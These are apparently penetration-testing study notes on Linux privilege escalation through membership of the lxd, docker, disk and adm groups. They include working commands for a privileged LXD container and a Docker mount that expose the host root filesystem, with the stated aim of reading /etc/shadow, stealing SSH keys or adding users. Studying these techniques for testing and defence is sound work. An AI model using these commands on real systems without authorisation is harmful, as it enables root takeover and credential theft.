## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [LXC/LXD](#lxc/lxd)
          - [Confirm Group Membership](#Confirm\Group\Membership)
  - [Docker](#Docker)
  - [Disk](#Disk)
  - [ADM](#ADM)

## Table of Contents

- [LXC/LXD](#lxc/lxd)
          - [Confirm Group Membership](#Confirm\Group\Membership)
  - [Docker](#Docker)
  - [Disk](#Disk)
  - [ADM](#ADM)

# LXC/LXD
- Similar to Docker and is Ubuntu's contianer Manager. Upon installation, all usres are added to the `LXD` group. Membership of this group can be used to escalata privileges by creating an `LXD` container, making it privileged, and then accessing the host file system at `/mnt/root`
###### Confirm Group Membership
```bash
id
```
1. `unzip alpine.zip`
2. Start the LXD initialization process
[How to setup and use LXD on Ubuntu - DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)
3. Import the local image
```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
4. Start a privileged Container with `security.privileged` set to `true` to run the container without a `UID` mapping, making the root user in the container the same as te root user on the host
```bash
lxc init alpine r00t -c security.privileged=true
```

5. Mount the host file system
```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
---

Device mydev added to r00t

```
6. Finally, spawn a shell inside the container instance. We can now browse the mounter host file system as root. To access the contents of the root directory on the host type `cd /mnt/root/root` from here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
```bash
lxc start r00t
~/64-bit Alpine$ lxc exec r00t /bin/sh
```


## Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`.
- This cmd creates a new Docker instance with the `/root` directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a user who has priv's.

## Disk
Users within the disk group have full access to any devices contained within `/dev` such as `/dev/sda1` which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root privileges. As with the Docker group example, this could be leveraged to retriece SSH keys, credentials or to add a user.

## ADM 
Members of the ADM group are able to read all logs stored in `/var/log` this does not directly grant root access. But can be used to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
```bash
id
```









